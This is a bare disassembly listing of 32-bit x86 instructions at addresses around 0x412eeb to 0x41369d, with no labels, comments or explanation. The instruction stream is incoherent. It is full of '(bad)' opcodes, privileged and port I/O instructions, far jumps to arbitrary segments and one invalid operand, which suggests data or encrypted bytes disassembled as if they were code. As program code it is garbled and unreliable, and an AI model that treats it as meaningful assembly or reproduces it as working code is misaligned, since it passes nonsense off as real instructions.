  412eeb:	cmc    
  412eec:	neg    BYTE PTR [edx+0x53e62f46]
  412ef2:	adc    bh,ah
  412ef4:	push   DWORD PTR [ecx]
  412ef6:	xor    eax,0xb47506b6
  412efb:	mov    ecx,0x3830914e
  412f00:	cli    
  412f01:	xchg   dl,al
  412f03:	push   0x9fb3d4f9
  412f08:	aad    0x40
  412f0a:	in     al,dx
  412f0b:	int    0x87
  412f0d:	xrelease xchg DWORD PTR [ecx],ecx
  412f10:	push   0x26db7776
  412f15:	cmp    dl,BYTE PTR [ebx-0x1eda9ba8]
  412f1b:	js     0x412f4d
  412f1d:	nop
  412f1e:	sub    BYTE PTR [edi],bh
  412f20:	adc    eax,0x8597aaf5
  412f25:	cmp    al,0xeb
  412f27:	xchg   edi,eax
  412f28:	xchg   ecx,eax
  412f29:	(bad)  
  412f2a:	fdiv   QWORD PTR [ecx+ebx*2+0x565f8d60]
  412f31:	clc    
  412f32:	sbb    DWORD PTR [ebp+0x26],esp
  412f35:	test   eax,0x224ac66
  412f3a:	lea    esp,[edx]
  412f3c:	pop    ds
  412f3d:	leave  
  412f3e:	cmc    
  412f3f:	pop    es
  412f40:	fwait
  412f41:	sub    DWORD PTR [esi+0x62d94be1],edx
  412f47:	mov    dh,0xf5
  412f49:	mov    eax,0x1a10d5b9
  412f4e:	retf   0x67b2
  412f51:	test   eax,esp
  412f53:	or     DWORD PTR [esi+0x2e2e0681],ecx
  412f59:	inc    eax
  412f5a:	mov    edi,DWORD PTR [eax]
  412f5c:	fidivr DWORD PTR [ebx+eax*1]
  412f5f:	add    al,0x30
  412f61:	adc    al,0x1f
  412f63:	(bad)  
  412f64:	(bad)  
  412f65:	push   ss
  412f66:	test   eax,0x38a20155
  412f6b:	ins    DWORD PTR es:[edi],dx
  412f6c:	mov    ss,WORD PTR [ebx+0x43]
  412f6f:	mov    eax,ds:0x4793672d
  412f74:	mov    ch,0x9
  412f76:	rol    BYTE PTR [esi-0x6],1
  412f79:	xchg   BYTE PTR [eax],bl
  412f7b:	outs   dx,DWORD PTR ds:[esi]
  412f7c:	inc    esp
  412f7d:	les    esp,FWORD PTR [ebp+eiz*2+0x9]
  412f81:	cmp    eax,0x8c964a89
  412f86:	mov    ?,WORD PTR [ebp+0x54]
  412f89:	inc    ebx
  412f8a:	ror    BYTE PTR [edi],1
  412f8c:	pop    eax
  412f8d:	aam    0x24
  412f8f:	xchg   edx,eax
  412f90:	push   esp
  412f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f92:	sti    
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f95:	mov    ah,0xee
  412f97:	outs   dx,DWORD PTR ds:[esi]
  412f98:	rcl    DWORD PTR [esi-0x7e0ed567],1
  412f9e:	mov    edx,0xfead4f97
  412fa3:	loop   0x412f3e
  412fa5:	fidivr DWORD PTR [eax-0x1ed1a243]
  412fab:	cmp    ebp,DWORD PTR [esi+0x4cd242ef]
  412fb1:	(bad)  
  412fb2:	in     eax,dx
  412fb3:	sbb    eax,0xa53fbead
  412fb8:	mov    ch,0x98
  412fba:	mov    al,ds:0xb067b09f
  412fbf:	push   0xffffffc5
  412fc1:	jno    0x412f7a
  412fc3:	inc    esi
  412fc4:	mov    eax,0x21d02e37
  412fc9:	daa    
  412fca:	cli    
  412fcb:	das    
  412fcc:	jge    0x412fe9
  412fce:	xchg   ebp,eax
  412fcf:	jmp    0x412fa5
  412fd1:	inc    ebp
  412fd2:	mov    esp,0xe62bc332
  412fd7:	adc    BYTE PTR [esi-0x7cb04934],dl
  412fdd:	xor    bl,ch
  412fdf:	add    eax,0x8e0eb8bd
  412fe4:	mov    dh,0xd7
  412fe6:	sub    BYTE PTR [esi-0x50],bl
  412fe9:	sbb    dh,BYTE PTR [edi+0x40]
  412fec:	mov    DWORD PTR [ecx-0x11ebeafe],ecx
  412ff2:	push   0x79
  412ff4:	aaa    
  412ff5:	and    esp,DWORD PTR [eax-0x52]
  412ff8:	test   al,0x9f
  412ffa:	clc    
  412ffb:	or     BYTE PTR [ebx+ecx*4+0x7b8c8bcb],dl
  413002:	sub    al,0xfe
  413004:	sub    ah,ch
  413006:	les    ecx,FWORD PTR [edi-0x22]
  413009:	mov    dh,0xc9
  41300b:	and    eax,0x973af66d
  413010:	jb     0x413011
  413012:	xor    ch,al
  413014:	cmp    DWORD PTR [edi+0x24],0x54
  413018:	outs   dx,DWORD PTR ds:[esi]
  413019:	cdq    
  41301a:	aaa    
  41301b:	add    BYTE PTR [eax-0x5456487a],ah
  413021:	mov    eax,0x43b95146
  413026:	fldcw  WORD PTR [edi-0x69]
  413029:	adc    DWORD PTR [ecx],edx
  41302b:	rcr    BYTE PTR [ebx-0x3636ea93],cl
  413031:	divps  xmm0,xmm0
  413034:	rcl    BYTE PTR [edi+0x40],0xc
  413038:	js     0x413026
  41303a:	mov    BYTE PTR ds:0xf74dd545,cl
  413040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413041:	mov    ah,dl
  413043:	push   0xffffff8d
  413045:	xor    al,BYTE PTR [ebx-0x10]
  413048:	jmp    0x413096
  41304a:	sub    al,0x5
  41304c:	fwait
  41304d:	inc    edx
  41304e:	icebp  
  41304f:	sub    esi,edi
  413051:	jg     0x41306b
  413053:	jns    0x41304f
  413055:	clc    
  413056:	sub    BYTE PTR [ebp+0x7e],bl
  413059:	popf   
  41305a:	sti    
  41305b:	cli    
  41305c:	neg    DWORD PTR [edi-0x332e09bc]
  413062:	stc    
  413063:	sti    
  413064:	pop    es
  413065:	sub    al,0xc7
  413067:	mov    DWORD PTR [ebx+0x4c],ebx
  41306a:	(bad)  
  41306c:	cmp    dh,BYTE PTR [ebx+edx*8-0xe]
  413070:	std    
  413071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413072:	jge    0x413017
  413074:	and    eax,0xd9b97083
  413079:	(bad)  
  41307a:	sbb    eax,0x7e214b50
  41307f:	imul   esi,DWORD PTR [ebx],0xffffffbb
  413082:	sub    eax,0x5d8679aa
  413087:	out    0x0,eax
  413089:	pushf  
  41308a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41308b:	mul    BYTE PTR [esi+0x50393fd]
  413091:	mov    ds:0xf063a45e,eax
  413096:	adc    DWORD PTR [eax],ebp
  413098:	cmp    DWORD PTR [edx-0x3c],edx
  41309b:	push   edi
  41309c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309d:	dec    DWORD PTR [esi+esi*4-0x44d57fe2]
  4130a4:	gs add al,0xbe
  4130a7:	int    0x48
  4130a9:	pop    ebx
  4130aa:	jae    0x413096
  4130ac:	push   es
  4130ad:	and    bh,BYTE PTR [edx+0x1a43ac54]
  4130b3:	xchg   edi,eax
  4130b4:	in     al,0xb
  4130b6:	cmc    
  4130b7:	mov    ds:0x35c6d667,eax
  4130bc:	(bad)  
  4130bd:	mov    ds:0x4be36fb1,eax
  4130c2:	sahf   
  4130c3:	lahf   
  4130c4:	aaa    
  4130c5:	push   esp
  4130c6:	mov    dl,cl
  4130c8:	mov    esi,0x1c5920bc
  4130cd:	call   0xad19:0x987d56bd
  4130d4:	mov    cl,0xd1
  4130d6:	mov    ecx,0xbdb53d38
  4130db:	aad    0x49
  4130dd:	sbb    DWORD PTR [ecx],ebp
  4130df:	bound  eax,QWORD PTR [edx]
  4130e1:	sub    al,0x2e
  4130e3:	push   es
  4130e4:	and    al,0xd8
  4130e6:	xor    esp,DWORD PTR [esi+edi*8-0x3d]
  4130ea:	mov    ss,WORD PTR [ecx]
  4130ec:	cmp    ah,BYTE PTR [ecx]
  4130ee:	and    esi,DWORD PTR [ebp+0x52]
  4130f1:	xchg   esp,eax
  4130f2:	fwait
  4130f3:	adc    eax,0xe17d3159
  4130f8:	(bad)  
  4130f9:	adc    ecx,DWORD PTR [esi]
  4130fb:	nop
  4130fc:	sub    edi,ebx
  4130fe:	loop   0x413131
  413100:	aaa    
  413101:	repnz push ecx
  413103:	retf   0x12f0
  413106:	push   esi
  413107:	jge    0x413138
  413109:	mov    DWORD PTR [edx+0x53d256e4],edi
  41310f:	dec    ebp
  413110:	lods   al,BYTE PTR ds:[esi]
  413111:	inc    ebp
  413112:	xlat   BYTE PTR ds:[ebx]
  413113:	xchg   edi,eax
  413114:	mov    ebp,0xfa89626e
  413119:	xchg   ebx,eax
  41311a:	push   0xe803de97
  41311f:	push   edx
  413120:	mov    al,ds:0xd1d1968b
  413125:	mov    edi,0x50009489
  41312a:	jl     0x4130f3
  41312c:	fistp  WORD PTR [edi-0x76868954]
  413132:	and    bl,BYTE PTR [ecx]
  413134:	dec    ebp
  413135:	fucomi st,st(4)
  413137:	mov    DWORD PTR [edi-0x1e1a0d6d],ebx
  41313d:	loop   0x413102
  41313f:	dec    esp
  413140:	in     al,0x7f
  413142:	sub    ebx,DWORD PTR [edi-0xa]
  413145:	pop    edi
  413146:	sub    ebx,DWORD PTR [esi]
  413148:	int    0x1c
  41314a:	test   BYTE PTR [ebx+0x5c],bl
  41314d:	push   ebp
  41314e:	pop    ss
  41314f:	rol    DWORD PTR [eax],0x2c
  413152:	xchg   BYTE PTR [eax+0x2e],al
  413155:	mov    ds:0x2e83a0ce,al
  41315a:	push   ebp
  41315b:	loope  0x4130f5
  41315d:	inc    BYTE PTR [eax+0x1b]
  413160:	into   
  413161:	int3   
  413162:	mov    cl,0xc5
  413164:	test   bh,al
  413166:	aaa    
  413167:	add    bh,dh
  413169:	xor    al,0x8f
  41316b:	daa    
  41316c:	ja     0x413129
  41316e:	stos   DWORD PTR es:[edi],eax
  41316f:	lods   eax,DWORD PTR ds:[esi]
  413170:	pop    edi
  413171:	sbb    DWORD PTR ds:0xa109960b,edi
  413177:	mov    dh,0x5f
  413179:	sbb    BYTE PTR [edi+eax*8+0x6f],dh
  41317d:	(bad)  
  41317e:	stos   BYTE PTR es:[edi],al
  41317f:	ror    ebp,1
  413181:	test   DWORD PTR [esi-0x70cf1817],esi
  413187:	jno    0x4131bc
  413189:	fisubr DWORD PTR [ebx+0xaf6f8de]
  41318f:	sub    eax,0x3f13d3b
  413194:	pop    esi
  413195:	and    bh,al
  413197:	test   al,0xdf
  413199:	fnstsw WORD PTR [ebp+0x29d7ab3f]
  41319f:	ins    BYTE PTR es:[edi],dx
  4131a0:	call   0x228222e4
  4131a5:	mov    cl,BYTE PTR ds:0x28b306d4
  4131ab:	inc    esi
  4131ac:	xor    esi,DWORD PTR [ecx-0x26]
  4131af:	mov    cl,0x30
  4131b1:	cmp    al,0x38
  4131b3:	clc    
  4131b4:	aas    
  4131b5:	fwait
  4131b6:	jnp    0x4131be
  4131b8:	and    al,0x1b
  4131ba:	mov    ebp,eax
  4131bc:	hlt    
  4131bd:	call   DWORD PTR [ebx-0x6782424b]
  4131c3:	mov    esi,0xbfbf3d1c
  4131c8:	sti    
  4131c9:	aas    
  4131ca:	and    eax,0x5fc90c1d
  4131cf:	ds push edx
  4131d1:	lods   al,BYTE PTR ds:[esi]
  4131d2:	sbb    edi,edx
  4131d4:	je     0x413183
  4131d6:	test   dh,dh
  4131d8:	and    BYTE PTR [esi],dh
  4131da:	iret   
  4131db:	add    edi,DWORD PTR [edi]
  4131dd:	cmp    BYTE PTR [ebx-0x31],cl
  4131e0:	pop    ss
  4131e1:	lahf   
  4131e2:	out    dx,eax
  4131e3:	sub    bh,BYTE PTR [edx-0x5d]
  4131e6:	repz mov al,ds:0x9feebe8b
  4131ec:	jge    0x413229
  4131ee:	push   edi
  4131ef:	jmp    0x10c6801b
  4131f4:	jp     0x413194
  4131f6:	mov    eax,ds:0xe162432f
  4131fb:	push   ebx
  4131fc:	std    
  4131fd:	rol    esp,0x90
  413200:	rol    ebx,0xd1
  413203:	retf   
  413204:	sbb    ecx,DWORD PTR [edi]
  413206:	ins    BYTE PTR es:[edi],dx
  413207:	xor    al,0xb6
  413209:	jecxz  0x41324a
  41320b:	cmp    al,0xad
  41320d:	faddp  st(4),st
  41320f:	mov    cl,0x20
  413211:	xchg   ebx,eax
  413212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413214:	cmp    BYTE PTR [ecx+0x46],bl
  413217:	and    eax,0xf8ec9aac
  41321c:	popf   
  41321d:	cmc    
  41321e:	test   BYTE PTR [edi],bh
  413220:	mov    dl,0x35
  413222:	pop    ecx
  413223:	dec    esp
  413224:	cmp    al,0xec
  413226:	fsubr  QWORD PTR ds:0x9dd3dbb5
  41322c:	das    
  41322d:	stos   BYTE PTR es:[edi],al
  41322e:	mov    ds:0x875c7bee,al
  413233:	mov    cl,0x5f
  413235:	retf   
  413236:	es sahf 
  413238:	fdivr  DWORD PTR [edx-0x5603aca9]
  41323e:	lea    edi,[edi-0x75262bf9]
  413244:	dec    ebp
  413245:	call   0xe87d:0xbd1785ed
  41324c:	mov    al,0xde
  41324e:	inc    esi
  41324f:	or     BYTE PTR [edi+0x55],0x52
  413253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413254:	pop    eax
  413255:	jmp    0x2dfdc2fc
  41325a:	sbb    edi,DWORD PTR [eax-0x3285eb02]
  413260:	push   esp
  413261:	ficom  WORD PTR [edx]
  413263:	mov    ah,0xc4
  413265:	mov    cl,0x2f
  413267:	call   0x39086cb2
  41326c:	jb     0x4132b3
  41326e:	and    DWORD PTR [edx-0x72f4ffe4],ebp
  413274:	adc    al,0x1e
  413276:	lahf   
  413277:	(bad)  
  413278:	adc    bl,BYTE PTR [edi+esi*4]
  41327b:	(bad)  
  41327d:	sbb    DWORD PTR [ecx+esi*1-0x3],esi
  413281:	inc    edx
  413282:	rcl    cl,1
  413284:	retf   0x6293
  413287:	pop    esp
  413288:	dec    ebp
  413289:	push   ebx
  41328a:	outs   dx,BYTE PTR ds:[esi]
  41328b:	mov    al,ds:0x81cb168d
  413290:	test   eax,0x8285fd54
  413295:	lods   al,BYTE PTR ds:[esi]
  413296:	or     BYTE PTR [ecx-0x79],ch
  413299:	push   0xb872c54e
  41329e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41329f:	mov    esi,0x7effa27
  4132a4:	xchg   esi,eax
  4132a5:	jmp    0x24c:0x2cfc92e6
  4132ac:	in     al,dx
  4132ad:	fdiv   DWORD PTR [edi+0x15]
  4132b0:	call   0x3786f13e
  4132b5:	sbb    al,0x11
  4132b7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4132b9:	pop    ebp
  4132ba:	xor    al,0xdb
  4132bc:	das    
  4132bd:	aad    0x43
  4132bf:	cmp    dh,BYTE PTR [edx+ebp*2+0x68]
  4132c3:	retf   
  4132c4:	daa    
  4132c5:	inc    esi
  4132c6:	jecxz  0x4132df
  4132c8:	pop    ecx
  4132c9:	sub    edi,ebp
  4132cb:	out    dx,eax
  4132cc:	repz pop edx
  4132ce:	ins    DWORD PTR es:[edi],dx
  4132cf:	adc    DWORD PTR [esi-0x78],esp
  4132d2:	or     DWORD PTR [eax],ebx
  4132d4:	mov    edx,ebx
  4132d6:	jo     0x41327b
  4132d8:	jmp    0xc923:0xe341d2eb
  4132df:	sub    al,bl
  4132e1:	push   ebx
  4132e2:	data16 aad 0xd9
  4132e5:	rol    DWORD PTR [edi+0x71],0x9
  4132e9:	sub    bh,BYTE PTR [esp+ecx*1-0x7a46f3d8]
  4132f0:	outs   dx,BYTE PTR ds:[esi]
  4132f1:	jle    0x41329d
  4132f3:	push   ebx
  4132f4:	cmp    BYTE PTR [esi+edx*4],dh
  4132f7:	xor    eax,0x96e9e319
  4132fc:	stc    
  4132fd:	sbb    al,0x99
  4132ff:	das    
  413300:	hlt    
  413301:	popf   
  413302:	fnsave [edi+0xfd9178]
  413308:	mov    eax,0x64c3853c
  41330d:	jo     0x413373
  41330f:	lock push ebp
  413311:	mov    dh,0x59
  413313:	xchg   esp,eax
  413314:	hlt    
  413315:	or     eax,0xb197547a
  41331a:	repnz jmp 0x553d:0x25682127
  413322:	scas   eax,DWORD PTR es:[edi]
  413323:	(bad)  
  413324:	pop    ecx
  413325:	stos   BYTE PTR es:[edi],al
  413326:	and    esp,DWORD PTR [eax]
  413328:	call   0xb89b:0x5e2c2bf8
  41332f:	dec    ecx
  413330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413331:	lds    edx,FWORD PTR [eax-0x1abd01ca]
  413337:	push   es
  413338:	pop    ss
  413339:	pop    ss
  41333a:	and    DWORD PTR [ecx],esp
  41333c:	sahf   
  41333d:	mov    al,0x11
  41333f:	adc    cl,ah
  413341:	add    al,0xf6
  413343:	mov    edi,0x82b75f8d
  413348:	ficom  DWORD PTR [edx+0x2a]
  41334b:	lds    eax,FWORD PTR [ebx+esi*1-0x1fc08b43]
  413352:	cmc    
  413353:	sbb    edi,0xe689929f
  413359:	pop    eax
  41335a:	fdiv   QWORD PTR [edx]
  41335c:	push   esp
  41335d:	push   edi
  41335e:	jmp    0x550b:0xc4ff5e36
  413365:	push   0x66d1ba42
  41336a:	fcmovu st,st(3)
  41336c:	adc    al,0xff
  41336e:	dec    ecx
  41336f:	sbb    DWORD PTR fs:[edi],ebp
  413372:	add    ebx,DWORD PTR [ecx-0x2ace3b39]
  413378:	xchg   edx,eax
  413379:	adc    bl,BYTE PTR gs:[ebx-0x147aeda1]
  413380:	loopne 0x413320
  413382:	jno    0x413373
  413384:	dec    esp
  413385:	cs pop ebx
  413387:	fcom   st(0)
  413389:	and    esi,DWORD PTR [ebp+0x5a]
  41338c:	enter  0xf020,0xb9
  413390:	int3   
  413391:	cmp    ebx,DWORD PTR [ebx-0x4c]
  413394:	inc    esi
  413395:	test   BYTE PTR [ecx-0x58],bh
  413398:	int3   
  413399:	dec    ecx
  41339a:	loope  0x413363
  41339c:	xchg   edx,eax
  41339d:	clc    
  41339e:	sbb    esi,DWORD PTR [ecx+ebp*4+0x60d0fc3f]
  4133a5:	xor    edi,ecx
  4133a7:	jns    0x413337
  4133a9:	jmp    0x413367
  4133ab:	rcl    BYTE PTR [esi+ebp*4],cl
  4133ae:	retf   0x5013
  4133b1:	adc    DWORD PTR [edx+0x12e98bcb],ebx
  4133b7:	aas    
  4133b8:	test   DWORD PTR [esi],ebp
  4133ba:	les    ebp,FWORD PTR [ecx-0x75]
  4133bd:	cld    
  4133be:	mov    edx,0xe29ff2f1
  4133c3:	add    ah,BYTE PTR [edx]
  4133c5:	test   DWORD PTR [esp+eax*4+0x10],esi
  4133c9:	ins    DWORD PTR es:[edi],dx
  4133ca:	test   BYTE PTR [edi+0x5db4b229],al
  4133d0:	dec    eax
  4133d1:	push   esp
  4133d2:	out    dx,eax
  4133d3:	xchg   esp,eax
  4133d4:	dec    esi
  4133d5:	jns    0x41341c
  4133d7:	push   ds
  4133d8:	push   eax
  4133d9:	add    eax,0xa1fcf809
  4133de:	and    esi,esi
  4133e0:	mov    BYTE PTR [eax+0x14],al
  4133e3:	aam    0x8e
  4133e5:	mov    ch,0xf5
  4133e7:	aas    
  4133e8:	and    DWORD PTR [ecx],ebx
  4133ea:	rcl    bh,0x67
  4133ed:	xchg   edx,eax
  4133ee:	lds    edi,FWORD PTR [edx]
  4133f0:	je     0x41343a
  4133f2:	je     0x413466
  4133f4:	dec    esi
  4133f5:	pusha  
  4133f6:	repnz and BYTE PTR [ecx],bh
  4133f9:	pop    ss
  4133fa:	loop   0x41344c
  4133fc:	cmp    al,BYTE PTR [eax]
  4133fe:	push   ebp
  4133ff:	pushw  ss
  413401:	pop    edi
  413402:	mov    eax,0x5a6bdf21
  413407:	dec    ebx
  413408:	xlat   BYTE PTR ds:[ebx]
  413409:	rcl    BYTE PTR [ecx-0x34313886],0x2f
  413410:	fcomi  st,st(0)
  413412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413413:	cwde   
  413414:	add    ecx,esi
  413416:	retf   0xfd0b
  413419:	dec    edx
  41341a:	xlat   BYTE PTR ds:[ebx]
  41341b:	cwde   
  41341c:	sub    DWORD PTR [edx],eax
  41341e:	in     al,dx
  41341f:	out    dx,al
  413420:	add    al,0xe
  413422:	cmp    al,0x65
  413424:	and    al,0xd9
  413426:	sub    ah,BYTE PTR [esi]
  413428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413429:	repnz in eax,0xe4
  41342c:	pop    ds
  41342d:	cwde   
  41342e:	inc    esi
  41342f:	jp     0x413494
  413431:	not    ch
  413433:	adc    al,0xd1
  413435:	cmp    edi,edx
  413437:	mov    gs,WORD PTR [eax+0x69e74747]
  41343d:	jl     0x4133d6
  41343f:	mov    ch,0x33
  413441:	scas   eax,DWORD PTR es:[edi]
  413442:	xor    ecx,DWORD PTR [ebx-0x20]
  413445:	sti    
  413446:	add    edi,DWORD PTR [esi-0x63]
  413449:	sub    BYTE PTR [edi],0xa5
  41344c:	out    0xc,al
  41344e:	or     al,0xd9
  413450:	fistp  WORD PTR [edx]
  413452:	sbb    ebx,DWORD PTR [esi]
  413454:	sub    bh,BYTE PTR [edx-0x68]
  413457:	out    dx,al
  413458:	adc    cl,0x6e
  41345b:	test   al,cl
  41345d:	dec    eax
  41345e:	mul    ah
  413460:	retf   
  413461:	out    dx,al
  413462:	xor    ebp,ebx
  413464:	sbb    eax,0x5bd20274
  413469:	enter  0xac86,0x50
  41346d:	fmulp  st(6),st
  41346f:	and    bh,BYTE PTR [ebp-0xe]
  413472:	cmp    dl,BYTE PTR [eax+0x38]
  413475:	pop    ss
  413476:	adc    BYTE PTR [esi],ch
  413478:	jp     0x4134ee
  41347a:	and    ch,BYTE PTR [edi+0x3f]
  41347d:	mov    ds:0x68a39a6d,eax
  413482:	add    dh,BYTE PTR [edx]
  413484:	mov    ecx,0x154513a0
  413489:	stos   BYTE PTR es:[edi],al
  41348a:	sbb    eax,0x43bad3b7
  41348f:	push   esi
  413490:	adc    BYTE PTR [edi-0x5a],dl
  413493:	cmp    eax,0xdf1e32ea
  413498:	dec    edi
  413499:	mov    ebp,0x90bcb508
  41349e:	xchg   esp,eax
  41349f:	jns    0x4134b8
  4134a1:	sbb    BYTE PTR cs:[edx+esi*2],ch
  4134a5:	mov    dh,0x67
  4134a7:	mov    ch,dl
  4134a9:	or     esp,DWORD PTR [edx]
  4134ab:	push   ecx
  4134ac:	jo     0x413448
  4134ae:	cmp    ch,dl
  4134b0:	adc    dh,BYTE PTR [ecx-0x51]
  4134b3:	out    dx,eax
  4134b4:	sub    al,0x60
  4134b6:	pop    edx
  4134b7:	pop    esp
  4134b8:	in     eax,0xb6
  4134ba:	jmp    0x7f651c78
  4134bf:	nop
  4134c0:	popf   
  4134c1:	add    al,0xeb
  4134c3:	outs   dx,BYTE PTR ds:[esi]
  4134c4:	fiadd  WORD PTR [edi+edi*8-0x78]
  4134c8:	dec    esp
  4134c9:	jmp    0xe8dc:0x17aed2e3
  4134d0:	lea    esi,[eax+0x5fc3cb1d]
  4134d6:	or     eax,0x31d855e9
  4134db:	xchg   esp,eax
  4134dc:	stos   BYTE PTR es:[edi],al
  4134dd:	xlat   BYTE PTR ds:[ebx]
  4134de:	enter  0x927e,0x89
  4134e2:	jle    0x4134d5
  4134e4:	(bad)  
  4134e5:	mov    cl,0x87
  4134e7:	dec    DWORD PTR [esp+esi*8+0x22]
  4134eb:	xor    bl,0x81
  4134ee:	aaa    
  4134ef:	adc    eax,0x18cd7b6a
  4134f4:	repz fwait
  4134f6:	jl     0x4134b9
  4134f8:	in     eax,dx
  4134f9:	push   0xc6e2fbce
  4134fe:	js     0x413553
  413500:	or     ecx,esp
  413502:	or     ecx,DWORD PTR [ebx-0x24]
  413505:	jo     0x4134a9
  413507:	loop   0x41351e
  413509:	ret    0x1c61
  41350c:	icebp  
  41350d:	xlat   BYTE PTR ds:[ebx]
  41350e:	jbe    0x4134d6
  413510:	aam    0xf0
  413512:	add    eax,0x404bc495
  413517:	pop    edx
  413518:	mov    bh,0x51
  41351a:	fild   QWORD PTR [ebx]
  41351c:	test   DWORD PTR [ebx-0x59c0a12f],esi
  413522:	mov    dl,0x9f
  413524:	mov    eax,ds:0x8a399788
  413529:	push   ecx
  41352a:	in     eax,dx
  41352b:	sbb    ah,ch
  41352d:	mov    edx,0x5135ef43
  413532:	cwde   
  413533:	or     eax,0xdab6222b
  413538:	imul   ecx,ebx,0xfffffff8
  41353b:	in     al,dx
  41353c:	imul   ebp,DWORD PTR [eax],0x563c9429
  413542:	stc    
  413543:	stos   BYTE PTR es:[edi],al
  413544:	push   ss
  413545:	pop    esi
  413546:	xchg   esi,eax
  413547:	mov    edx,0xe0ac07a8
  41354c:	(bad)  
  41354d:	pop    eax
  41354e:	nop
  41354f:	sub    esp,DWORD PTR [esi+0x40]
  413552:	shl    BYTE PTR [esi+0x46],1
  413555:	jg     0x4135b8
  413557:	fnsave [ebp-0x2557b0a9]
  41355d:	dec    eax
  41355e:	xor    al,0xda
  413560:	ins    BYTE PTR es:[edi],dx
  413561:	shr    BYTE PTR [ecx-0x4a60b2c3],cl
  413567:	das    
  413568:	jb     0x4134ec
  41356a:	xchg   esp,eax
  41356b:	sub    bl,BYTE PTR [eax]
  41356d:	std    
  41356e:	lds    ebp,FWORD PTR [ecx-0x22]
  413571:	loopne 0x41356f
  413573:	cli    
  413574:	sub    BYTE PTR [ebp-0x78],ch
  413577:	push   es
  413578:	nop
  413579:	mov    ch,0xb4
  41357b:	jge    0x4135cd
  41357d:	and    BYTE PTR [ecx],bl
  41357f:	in     eax,dx
  413580:	aam    0x9
  413582:	fldenv [esi+edx*1-0x52aed576]
  413589:	push   eax
  41358a:	shl    ebp,1
  41358c:	xor    eax,0xc0759f29
  413591:	nop
  413592:	inc    bh
  413594:	and    bl,BYTE PTR [edi+0x11]
  413597:	xlat   BYTE PTR ds:[ebx]
  413598:	cwde   
  413599:	repz in eax,0xd2
  41359c:	push   ebx
  41359d:	xor    esi,DWORD PTR [ecx+0x4]
  4135a0:	sahf   
  4135a1:	pop    ecx
  4135a2:	pushw  es
  4135a4:	in     eax,dx
  4135a5:	adc    BYTE PTR [ebx+ebx*2+0x20],ah
  4135a9:	je     0x41353f
  4135ab:	lock sbb al,BYTE PTR [ecx+esi*2+0x5b]
  4135b0:	adc    edx,DWORD PTR [ebp-0x6cbc9b5b]
  4135b6:	push   0xffffffc7
  4135b8:	nop
  4135b9:	fist   WORD PTR [ebp-0x7a]
  4135bc:	repnz dec edi
  4135be:	in     eax,dx
  4135bf:	stc    
  4135c0:	push   esp
  4135c1:	in     eax,dx
  4135c2:	mov    eax,ds:0x1c6ff637
  4135c7:	les    esi,FWORD PTR [edx-0x6c]
  4135ca:	adc    al,0xcb
  4135cc:	cmp    cl,BYTE PTR [edx+ebx*1+0x8b54075]
  4135d3:	mov    ebx,0x5754b39c
  4135d8:	es scas eax,DWORD PTR es:[edi]
  4135da:	pop    esp
  4135db:	ins    BYTE PTR es:[edi],dx
  4135dc:	jns    0x413646
  4135de:	mov    BYTE PTR [edx+0x5501838c],dh
  4135e4:	sar    BYTE PTR [ecx-0x2e],1
  4135e7:	pop    edx
  4135e8:	sub    ch,BYTE PTR [esi]
  4135ea:	inc    ebp
  4135eb:	xchg   ebp,eax
  4135ec:	cmp    BYTE PTR [esi],0xfa
  4135ef:	inc    ecx
  4135f0:	sar    esi,0x4b
  4135f3:	jl     0x41366a
  4135f5:	dec    ebx
  4135f6:	scas   eax,DWORD PTR es:[edi]
  4135f7:	mov    esp,0x95ef896a
  4135fc:	imul   ebp,DWORD PTR [ecx-0x6f902e33],0xffffff9a
  413603:	and    DWORD PTR [edx+0x9],0x31aa44b3
  41360a:	xor    al,0x6c
  41360c:	hlt    
  41360d:	rcr    BYTE PTR [esi+ecx*2-0x3c],0xe3
  413612:	sbb    DWORD PTR [edx-0x5a180700],ebp
  413618:	pop    es
  413619:	inc    edi
  41361a:	repz test DWORD PTR [eax+0x70],0x7ecea963
  413622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413623:	mov    bh,0x4
  413625:	scas   al,BYTE PTR es:[edi]
  413626:	icebp  
  413627:	jnp    0x413655
  413629:	dec    ecx
  41362a:	es mov cl,0x10
  41362d:	jbe    0x41368b
  41362f:	es sahf 
  413631:	mov    ebp,0xc10cf731
  413636:	arpl   WORD PTR [edi+0x39],dx
  413639:	add    BYTE PTR [edx-0x49899b2f],al
  41363f:	fwait
  413640:	das    
  413641:	clc    
  413642:	jbe    0x4135e4
  413644:	xor    DWORD PTR [eax-0x43],edx
  413647:	rol    eax,1
  413649:	mov    esp,0x247bc32f
  41364e:	test   al,0xc7
  413650:	ins    BYTE PTR es:[edi],dx
  413651:	loope  0x41361b
  413653:	mov    eax,0xc66496cb
  413658:	js     0x413637
  41365a:	sub    al,0x36
  41365c:	mov    dh,0x37
  41365e:	jb     0x4136a0
  413660:	and    eax,0x8a0074cf
  413665:	push   esi
  413666:	icebp  
  413667:	ror    BYTE PTR [ebp-0x38f8ecbe],1
  41366d:	and    BYTE PTR ds:0xa6576dec,bh
  413673:	pop    ebp
  413674:	push   edi
  413675:	jmp    0x2949:0x42605d92
  41367c:	out    0xdf,al
  41367e:	add    DWORD PTR [ebp-0x6d],esi
  413681:	jl     0x413678
  413683:	fld    QWORD PTR [esi+0x12]
  413686:	mov    edi,DWORD PTR [ecx]
  413688:	cs xchg esi,eax
  41368a:	push   cs
  41368b:	cmc    
  41368c:	sub    ebx,edx
  41368e:	aas    
  41368f:	mov    ds,WORD PTR [esi-0x40ac26be]
  413695:	mov    eax,0x6f8a851
  41369a:	stos   DWORD PTR es:[edi],eax
  41369b:	ret    
  41369c:	push   ds
  41369d:	add    al,0xf0
